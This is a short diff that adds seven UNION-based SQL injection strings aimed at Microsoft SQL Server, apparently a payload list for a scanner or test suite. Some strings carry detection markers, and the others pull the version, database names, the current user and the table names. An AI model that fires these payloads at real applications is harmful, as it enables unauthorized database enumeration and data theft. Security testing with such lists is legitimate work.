@@ -1,0 +1,7 @@
+' UNION SELECT 'SQLI_UNION_MARKER'--
+' UNION SELECT NULL,'SQLI_UNION_MARKER'--
+' UNION SELECT @@version--
+' UNION SELECT DB_NAME()--
+' UNION SELECT USER_NAME()--
+' UNION SELECT name FROM master..sysdatabases--
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
